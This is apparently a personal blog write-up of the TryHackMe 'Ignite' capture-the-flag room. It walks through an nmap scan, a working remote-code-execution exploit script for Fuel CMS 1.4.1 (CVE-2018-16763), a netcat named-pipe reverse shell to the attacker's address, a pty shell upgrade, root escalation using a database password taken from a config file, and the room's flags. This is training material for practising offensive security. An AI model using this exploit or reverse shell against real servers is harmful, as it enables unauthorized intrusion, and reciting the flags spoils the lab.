---
title: "Ignite - TryHackMe"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Ignite - TryHackMe writeup"
---

[TryHackMe | Ignite](https://tryhackme.com/room/ignite)

A new start-up has a few issues with their web server.

Root the box! Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [lollava](https://tryhackme.com/p/lollava) aka Paradox.

Enjoy the room! For future rooms and write-ups, follow [@darkstar7471](https://twitter.com/darkstar7471) on Twitter.

First, port scan :

```bash
nmap -sV --script vuln 10.10.217.248
```

Open 80 port :

Launch the web application (bottom of the home page)

```bash
That's it!
To access the FUEL admin, go to : http://10.10.217.248/fuel
User name: admin
Password: admin
```

So we have the admin creds but, i'll check if there is some exploit for the Fuel CMS (there is one)

```python
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

import requests
import urllib

url = "http://10.10.217.248/" # Target IP
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
    xxxx = input('cmd:')
    url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(xxxx)+"%27%29%2b%27"
    r = requests.get(url)

    html = "<!DOCTYPE html>"
    htmlcharset = r.text.find(html)

    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text,begin,2)

    print(r.text[0:dup])
```

There you go !

✅ You can send a reverse shell with the php filter

```python
cmd: rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.45.74 9999 >/tmp/f
```

✨Better shell with root access 👀

```python
python -c  'import pty; pty.spawn("/bin/bash")'
```

With the python interpreter you can have a better shell now, with the config of the database we have the root password **mememe**

```python
su -r root
password: mememe
```

**#1 User.txt**

```bash
#cd /home/www-data && cat user.txt
6470e394cbf6dab6a91682cc8585059b
```

**#2 Root.txt**

```bash
#cat root.txt
b9bbcb33e11b80be759c4e844862482d
```

```python
#cat /var/www/html/fuel/application/config/database.php
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        **'username' => 'root',
        'password' => 'mememe',**
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```
